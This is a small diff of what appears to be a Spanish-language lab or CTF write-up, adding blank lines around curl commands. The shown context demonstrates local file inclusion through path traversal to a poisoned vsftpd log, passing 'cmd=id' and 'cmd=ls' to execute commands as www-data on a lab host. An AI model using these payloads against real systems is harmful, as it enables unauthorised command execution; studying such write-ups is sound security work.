@@ -184,6 +184,7 @@ Sun Aug 16 19:58:11 2026 [pid 428] [
 Ahora intentaremos enviar comandos a través de curl.
 ```bash
 curl "http://172.17.0.2/index.php?studio=../../../var/log/vsftpd.log&cmd=id"
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
@@ -222,6 +223,7 @@ Sun Aug 16 19:58:11 2026 [pid 428] [uid=33(www-data) gid=33(www-data) groups=33(
 Prueba 2.
 ```bash
 curl "http://172.17.0.2/index.php?studio=../../../var/log/vsftpd.log&cmd=ls"
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
